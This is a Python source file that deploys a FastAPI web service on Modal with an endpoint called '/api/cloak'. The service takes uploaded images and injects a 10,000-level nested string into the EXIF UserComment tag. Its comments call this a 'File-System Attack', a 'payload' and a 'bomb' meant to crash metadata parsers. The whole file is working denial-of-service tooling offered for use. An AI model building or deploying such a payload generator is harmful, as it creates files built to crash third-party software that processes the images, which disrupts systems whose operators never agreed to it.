import modal
from fastapi import FastAPI, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import Response
import io

# 1. The Architecture
# Notice we no longer need heavy ML libraries like torch.
# We are adding 'piexif' to manipulate the file headers.
app = modal.App("sigil-metadata-engine")

image = modal.Image.debian_slim(python_version="3.11").pip_install(
    "fastapi", "python-multipart", "Pillow", "piexif"
)

web_app = FastAPI()

web_app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

# 2. The File-System Attack
def create_metadata_bomb(image_bytes: bytes) -> bytes:
    from PIL import Image
    import piexif
    
    # Open the image. We will NOT touch the pixel math.
    img = Image.open(io.BytesIO(image_bytes)).convert("RGB")
    
    # 3. Construct the Payload
    # We create a deeply recursive JSON-like string.
    # It is 10,000 layers deep.
    payload = "{" + '"crash":'*10000 + "1" + "}" * 10000
    
    # Initialize a blank EXIF dictionary
    exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}, "thumbnail": None}
    
    # Inject the payload into the standard UserComment tag (Tag 37510)
    # This is where parsers commonly look for image descriptions
    exif_dict["Exif"][piexif.ExifIFD.UserComment] = piexif.helper.UserComment.dump(payload)
    
    # Compile the malicious dictionary back into raw bytes
    exif_bytes = piexif.dump(exif_dict)
    
    out_io = io.BytesIO()
    
    # Save the file.
    # quality=100 ensures ZERO compression or pixel alteration.
    # exif=exif_bytes attaches our bomb to the file header.
    img.save(out_io, format="JPEG", quality=100, exif=exif_bytes)
    
    return out_io.getvalue()

# 4. The Request Handler
@web_app.post("/api/cloak")
async def cloak_endpoint(file: UploadFile = File(...)):
    image_bytes = await file.read()
    
    # Process the file
    bombed_bytes = create_metadata_bomb(image_bytes)
    
    # We return a JPEG because EXIF exploits are natively supported and highly volatile in JPEGs
    return Response(content=bombed_bytes, media_type="image/jpeg")

# 5. The Deployment Command
# We can drop the T4 GPU requirement, making this run instantly and practically for free.
@app.function(image=image)
@modal.asgi_app()
def serve():
    return web_app